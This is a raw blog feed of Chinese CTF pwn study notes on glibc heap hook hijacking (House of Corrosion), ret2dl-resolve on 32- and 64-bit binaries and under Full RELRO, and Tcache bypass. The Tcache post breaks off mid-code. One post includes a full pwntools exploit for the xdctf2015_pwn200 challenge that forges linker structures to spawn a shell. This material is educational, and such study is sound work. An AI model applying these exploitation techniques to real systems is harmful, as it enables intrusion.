class="headerlink" title="1.篡改top域"></a>1.篡改top域</h3><p>通过改写main_arena，篡改top域并将top chunk转移到__free_hook之前，便可通过分配chunk劫持__free_hook</p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li>前提是得能分配很大的chunk(分配很多次也行),因为实际上能伪造为top chunk的size域的地址离free__hook很远(glibc2.23这一偏移为0xb58)</li><li>攻击main_arena的top域也并非易事,malloc_hook-0x23(glibc2.23)处的字节错位得到的fake_chunk并不足以让你覆盖到top域(<del>有堆溢出就当我没说</del>)<br>  倒也有解决办法，虽然覆盖不了top域但可以覆盖fastbinsY数组,修改然后获得一个能覆盖到top域的chunk<br>(理论上是可行的，但实际过程遇到了很多高手情况,以后再回来复现吧…)</li></ol><h3 id="2-House-of-Corrosion"><a href="#2-House-of-Corrosion" class="headerlink" title="2.House of Corrosion"></a>2.House of Corrosion</h3><p>篡改global_max_fast为一个较大值(<code>Unsortedbin Attack</code>),然后计算__free_hook到FastbinY的偏移,再计算要伪造的bin的size</p><pre class=" language-python"><code class="language-python">fastbin_ptr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main_arena'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">8</span>idx<span class="token operator">=</span><span class="token punctuation">(</span>target_addr<span class="token operator">-</span>fastbin_ptr<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span>size<span class="token operator">=</span>idx<span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x20</span></code></pre><p>size计算简化之后是这样的</p><pre class=" language-python"><code class="language-python">chunk_size <span class="token operator">=</span> <span class="token punctuation">(</span>delta <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x20</span> ，delta为目标地址与fastbinY的offset</code></pre><p>然后free掉对应size的chunk，更改其的fd指针为目标值(在这里就是system函数地址)，再将A分配回来便完成劫持<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202211221629378.png"></p><h3 id="3-制造字节错位"><a href="#3-制造字节错位" class="headerlink" title="3.制造字节错位"></a>3.制造字节错位</h3><p>不方便利用不就是因为没有字节错位吗？制造一个就好了<code>Unsortedbin Attack</code>在__free_hook上方写入unsortedbin地址(0x7f开头)，然后正常<code>Fastbin Arbitrary Alloc</code>劫持</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://aidaip.github.io/binary/2020/02/20/House-of-Corrosion.html">AiDai  House of Corrosion</a><br><a href="https://zhuanlan.zhihu.com/p/448880453">House of Corrosion 原理及利用</a><br><a href="https://ray-cp.github.io/archivers/heap_global_max_fast_exploit">堆中global_max_fast相关利用</a><br><a href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/">malloc_hook以及free_hook劫持原理</a><br><a href="https://lexsd6.github.io/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数</a></p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve(2)：64位利用及Full RELRO</title>
      <link href="/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/"/>
      <url>/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/</url>
      
        <content type="html"><![CDATA[<h1 id="64位ret2dl-resolve"><a href="#64位ret2dl-resolve" class="headerlink" title="64位ret2dl-resolve"></a>64位ret2dl-resolve</h1><h2 id="32位与64位差别"><a href="#32位与64位差别" class="headerlink" title="32位与64位差别"></a>32位与64位差别</h2><ol><li>相关结构体大小不同</li><li><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>的参数reloc_arg在32位是地址偏移reloc_offset,在64位是reloc_index，含义是所重定位符号的重定位项在重定位表“.rel.plt”中的下标。重定位项地址reloc = JMPREL + reloc_index*3*8。</li><li>在这里直接引用<a href="https://sp4n9x.github.io/">Sp4n9x</a>师傅的一段话(<del>具体为啥会有问题我暂时也没理解到</del>)</li></ol><ul><li>64位情况下，bss节一般位于0x600000之后，重定位表“.rela.plt一般在0x400000左右，所以我们构造的r_info的高位(sym_index)和reloc_arg一般会很大。又因为计算符号项地址&amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]和符号版本项地址vernum[ELFW(R_SYM) (reloc-&gt;r_info)]时，数组的数据类型的大小不同(symtab中的结构体大小为0x18字节，vernum的数据类型为uint16_t，大小为0x2字节)，这就导致vernum[ELFW(R_SYM) (reloc-&gt;r_info)]大概率会访问到0x400000到0x600000之间的不可读区域(64位下，这个区间一般不可读)，使得程序报错。</li></ul><pre class=" language-c"><code class="language-c">      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>        <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>      version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>所以我们要想办法进行绕过：(不绕过也是有很小几率成功的)</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL"><a href="#方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL" class="headerlink" title="方案一：使l->l_info[VERSYMIDX (DT_VERSYM)] == NULL"></a>方案一：使l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL</h3><p>l-&gt;l_info[VERSYMIDX (DT_VERSYM)] 的地址在64位是link_map+0x1c8,32位为link_map+0xe4<br>我们需要先泄露link_map地址，再将link_map+0x1c8设置成不为0。<br>之后就是和32位下的思路一样了，根据64位下的结构体伪造结构体，伪造reloc_arg来进行攻击。</p><h3 id="方案二：使sym-gt-st-other-x3D-x3D-0"><a href="#方案二：使sym-gt-st-other-x3D-x3D-0" class="headerlink" title="方案二：使sym->st_other== 0"></a>方案二：使sym-&gt;st_other== 0</h3><p>这应该是最普遍的做法吧<br>既然是绕过，干脆绕个大的，直接不进入最外层的判断</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>程序会把该函数判定为已解析过的函数，进入else语句中<br>else语句相当于将l-&gt;l_addr + sym-&gt;st_value的值存在value中,作为函数的真实地址</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* We already found the symbol.  The module (and therefore its load     address) is also known.  */</span>      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-></span>l_addr <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> l<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-c"><code class="language-c">DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//DL_FIXUP_VALUE_TYPE是fixup/profile_fixup返回值的类型。保存函数的真实地址。</span></code></pre><pre class=" language-c"><code class="language-c">    lookup_t result<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//查找函数的结果，其为定义函数的共享对象的加载基地址</span></code></pre><p>我们可以选择把 sym-&gt;st_value 伪造为某个已解析函数的got表地址,如read.got ，再把 l-&gt;l_addr 改为 目标地址如 system 到 read 的偏移。那么我们的 value 最后就是 system地址。<br>要实现以上利用，我们需要伪造位于link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针、link_map+0x68的DT_STRTAB指针。之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体。为了方便，我在构造的过程中一般将reloc_index作为0来进行构造。<br>总的来说要满足以下条件(回忆一下延迟绑定的过程便很好理解)</p><ul><li>1.link_map中的DT_STRTAB、DT_SYMTAB、DT_JMPREL可读  </li><li>2.DT_SYMTAB结构体中的d_ptr即sym，(*(sym+5))&amp;0x03 != 0  </li><li>3.(reloc-&gt;r_info)&amp;0xff == 7  </li><li>4.rel_addr = l-&gt;addr + reloc-&gt;r_offset即原先需要修改的got表地址有可写权限  </li><li>5.l-&gt;l_addr + sym-&gt;st_value 为system的地址</li></ul><h1 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>Full RELRO</code>：继承<code>Partial RELRO</code>的所有保护，并且.got.plt被标为只读。此时延迟绑定技术被禁止，所有的外部函数地址将在程序装载时解析、装入，并标记为只读，不可更改。此时不需要link_map以及dl_runtime_resolve函数，则GOT表中这两项数据均置为0.</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><code>.dynamic</code>段中的以<code>DT_DEBUG</code>符号为关键字的值，指向了一个叫做<code>r_debug</code>结构体,其中的<code>r_map</code>字段即我们需要的<code>link_map</code>的地址<br>而至于<code>dl_runtime_resolve</code>函数，则可以从别的已加载进程序内存的且没有开<code>FULL RELRO</code>保护的<code>elf</code>(libc.so)的<code>GOT</code>中寻找.<br>link_map结构体内存在<code>l_next</code>和<code>l_prev</code>两个结构体指针可以让我们遍历到所有已加载进来的<code>elf</code>文件的<code>link_map</code>,再通过读取link_map中的<code>l_info[DT_PLTGOT]</code>是否为0来判断是否开启Full RELRO保护</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章<br><a href="https://bbs.pediy.com/thread-253833.htm#msg_header_h2_2">dl_runtime_resolve结合源码分析及常见的几种攻击手法</a><br><a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br><a href="https://www.cnblogs.com/pwnfeifei/p/15701859.html">ret2dl_resolve</a><br><a href="https://ray-cp.github.io/archivers/ret2dl_resolve_analysis#64%E4%BD%8Delf%E7%A8%8B%E5%BA%8F%E7%9A%84ret2dl_resolve">ret2dl_resolve解析</a><br><a href="https://www.cnblogs.com/winmt/articles/15692475.html">ret2dlresolve 与 改写got表</a><br><a href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/#%E4%B8%80.-ret2dlresolve%E5%8E%9F%E7%90%86">Ret2dlresolve攻击——从No RELRO到FULL RELRO</a></p>]]></content>
      
      
      <categories>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve(1)：原理及基础利用</title>
      <link href="/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/"/>
      <url>/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>ret2dl-resolve于2015年在论文_How the ELF Ruined Christmas_中被提出，作者是来自加州大学圣塔芭芭拉分校的Alessandro Di Federico等人。随着安全防御机制的不断完善，如今一个现代的漏洞利用通常包含两个阶段：</p><ol><li>通过信息泄露获得程序的内存布局</li><li>实际的漏洞利用</li></ol><p>然而，从程序中获得内存布局的方法并不总是可行的，且获得的被破坏的内存有时并不可靠。于是作者提出来ret2dl-resolve，巧妙地利用了ELF格式以及动态装载器的弱点，不需要进行信息泄露就可以直接标识关键函数的位置并调用。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>如果之前没有理解动态链接的过程和相应的段、节等前置知识，理解ret2dl-resolve是有些困难的，在这里放下我学习时的资料：<br>完整动态链接过程：<a href="https://zhuanlan.zhihu.com/p/134105591">深入窥探动态链接</a>    <a href="https://www.jianshu.com/p/8dd91ec35dda">动态链接</a><br>相关的一些节、段的介绍：<a href="https://www.thinbug.com/q/53156275">https://www.thinbug.com/q/53156275</a><br>源码：<a href="https://man7.org/linux/man-pages/man5/elf.5.html">相关段、节源码</a></p><h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>动态链接比静态链接要灵活得多，但它是以牺牲一部分性能为代价的。为优化动态链接性能，ELF采用了一种 <strong><code>延迟绑定(Lazy Binding)</code></strong> 的做法。基本思想就是当函数第一次被用到时才进行绑定(符号查找、重定位等)<br>具体流程引用一位师傅的图片<img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A.png"><br>用通俗一点(<del>不太准确</del>)的话描述一下过程(<del>我的理解</del>): ELF是通过函数<code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>实现绑定的.<br>$\color{pink}{第一步}$，每个导入函数都在PLT表中有一个条目，当函数第一次被调用时,程序通过call指令执行到该函数(以read举例)的read@plt条目的第一条指令，read@plt表的第一指令为跳转到read@got条目，而因为read函数是第一次被调用，此时read@got条目中存的是read@plt条目第二条指令的位置，再跳转回来相当于就是顺序执行read@plt的指令.<br>$\color{pink}{第二步}$，read@plt条目的第二条指令是将导入函数的标识(Elf_Rel在.rel.plt段中的偏移,也就是参数中的reloc_index)压入栈中，然后跳转到PLT0执行<br>$\color{pink}{第三步}$，PLT0包含两条指令，先将GOT[1]的值(也就是<code>_dl_runtime_resolve)</code>函数的第一个参数link_map_obj)压入栈中，然后跳转到GOT[2]保存的地址处，即<code>_dl_runtime_resolve)</code>函数.<br>$\color{pink}{第四步}$，<code>_dl_runtime_resolve)</code>函数完成地址的绑定，大概逻辑是这样的：<br>先通过link_map获得重定位函数所在了 libary 的基地址及<code>.dynamic</code>的地址，也就获得了.dynamic节中存有的其他和绑定相关的节(.dynsym .dynstr .rela.plt)的地址。利用第二个参数reloc_arg及rela.plt可以得到read函数在.dynsym中的下标，进而得到read函数符号表项<code>Elf32_Sym</code>(<code>Elf64_Sym</code>)的指针，记作sym。.dynstr节的地址+sym-&gt;st_name得到”read\x00”这一字符串的地址，再将字符串地址作为参数利用<code>_dl_lookup_symbol_x</code>函数在动态库中遍历搜索得到函数地址，填入read@got条目内并调用。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><ol><li>关闭RELRO保护：即.dynamic段可写。动态装载器是通过.dynamic段来获取.dynstr节的地址，故可以通过改写.dynamic段相应DT_STRTAB来在任意地址伪造.dynstr节并欺骗动态装载器</li><li>开启Partial RELRO保护：通过伪造参数reloc_index可制造一个巨大的偏移，使得内存地址超出.rel.plt段来到.bss段，攻击者就可伪造fake_rel等结构欺骗动态装载器</li><li>Full RELRO: 详见(2)部分内容</li></ol><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_3.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_1.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_2.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 启动程序</span><span class="token comment" spellcheck="true"># io = remote('node4.buuoj.cn',26320)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># io = gdb.debug('./bof')</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># libc = ELF('./')</span><span class="token comment" spellcheck="true"># 源程序gadget</span>write_plt <span class="token operator">=</span> <span class="token number">0x80483C0</span>vuln <span class="token operator">=</span> <span class="token number">0x80484D6</span>bss_addr <span class="token operator">=</span> e<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>pop_ebp <span class="token operator">=</span> <span class="token number">0x804862b</span>leave_ret <span class="token operator">=</span> <span class="token number">0x8048445</span>pop_ebx_esi_edi_ebp <span class="token operator">=</span> <span class="token number">0x8048628</span><span class="token comment" spellcheck="true"># 程序中section地址</span>plt0 <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrrel_plt <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrdynsym <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrdynstr <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr<span class="token comment" spellcheck="true"># 伪造相应结构</span>stack_size <span class="token operator">=</span> <span class="token number">0x800</span>base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_sizefake_dynsym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">32</span>align <span class="token operator">=</span> <span class="token number">0x10</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span>fake_dynsym_addr <span class="token operator">+=</span> alignfake_dynstr_addr <span class="token operator">=</span> fake_dynsym_addr<span class="token operator">+</span><span class="token number">16</span>st_name <span class="token operator">=</span> fake_dynstr_addr <span class="token operator">-</span> dynstrst_value <span class="token operator">=</span> <span class="token number">0</span>st_size <span class="token operator">=</span> <span class="token number">0</span>st_info <span class="token operator">=</span> <span class="token number">0x12</span><span class="token comment" spellcheck="true">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type</span>fake_dynsym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_value<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_size<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_info<span class="token punctuation">)</span>fake_rel_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">24</span>reloc_arg <span class="token operator">=</span> fake_rel_addr<span class="token operator">-</span>rel_pltr_sym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">0x10</span>r_type <span class="token operator">=</span> <span class="token number">0x7</span>r_info <span class="token operator">=</span> <span class="token punctuation">(</span>r_sym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>r_type<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>r_offset <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>fake_rel <span class="token operator">=</span> p32<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>fake_dynstr <span class="token operator">=</span> b<span class="token string">'system\x00'</span><span class="token comment" spellcheck="true"># stack pivot</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload_migrate <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pop_ebx_esi_edi_ebp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>base_stage<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>base_stage<span class="token number">-4</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_migrate<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ret2dl_resolve</span>binsh_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">80</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>plt0<span class="token punctuation">,</span>reloc_index<span class="token punctuation">,</span><span class="token string">'retn'</span><span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span><span class="token string">'arg1'</span><span class="token punctuation">,</span><span class="token string">'arg2'</span><span class="token punctuation">,</span>fake_rel<span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span>align<span class="token punctuation">,</span>fake_dynsym<span class="token punctuation">,</span>fake_dynstr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> b<span class="token string">'/bin/sh\x00'</span>payload <span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>b<span class="token string">'a'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章！<br>最最最详细(包括64位利用细节)：<a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br>最最最容易理解：<a href="https://zikh26.github.io/posts/ba418f23.html">关于ret2_dl_runtime_resolve的学习总结</a><br>以及CTF权威指南(Pwn篇)</p>]]></content>
      
      
      <categories>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache机制绕过</title>
      <link href="/2022/11/10/tcache-ji-zhi-rao-guo/"/>
      <url>/2022/11/10/tcache-ji-zhi-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>Tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。<br>对攻击者而言,Tcache的不安全机制为攻击者带来了大量新的漏洞利用方式，但同时也使先前的一些利用方法(如Unsortedbin Attak)等漏洞利用减弱甚至失效，并且在一些题中Tcache的利用会相当麻烦。故本文探究Tcache机制的绕过方法(glibc2.26-2.27)</p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="1-分配大小不在Tcache范围内的堆块"><a href="#1-分配大小不在Tcache范围内的堆块" class="headerlink" title="1.分配大小不在Tcache范围内的堆块"></a>1.分配大小不在Tcache范围内的堆块</h2><p>好像说了句废话，不过在某些题中还是有用的.<br>Tcache的chunk范围在0x410(1032)字节以内</p><h2 id="2-填满Tcache"><a href="#2-填满Tcache" class="headerlink" title="2.填满Tcache"></a>2.填满Tcache</h2><p>好像也是句废话<br>free某个tcache超过7次，也就是将存放在tcache结构体中的该范围bins的数量占满，后续free的堆块就会放到相应的bin中</p><h2 id="3-修改Tcache结构体中的counts域"><a href="#3-修改Tcache结构体中的counts域" class="headerlink" title="3.修改Tcache结构体中的counts域"></a>3.修改Tcache结构体中的counts域</h2><p>所谓的绕过Tcache机制，无非就是使释放的堆块不进入Tcache中，分配的堆块不从Tcache中取出.</p><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p>如果我们想让释放的堆块不进入Tcache中，就需要对应Tcache bin的counts域不小于tcache_count(默认为7)，即Tcache已满.但如过counts域不为0，在分配堆块时就一定会从Tcache中取出,前后两个发生冲突.</p><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><p>下面是tcache_put的调用过程</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>          <span class="token comment" spellcheck="true">/* Fill cache first, return to user only if cache fills.         We may return one of these chunks later.  */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb          <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">tcache_put</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>          return_cached <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>          <span class="token keyword">else</span>        <span class="token punctuation">{</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>        <span class="token punctuation">}</span></code></pre><p>重点关注这一条件判断，如果我们能绕过这一判断进入else，就能实现绕过Tcache机制进行堆块分配</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb          <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token 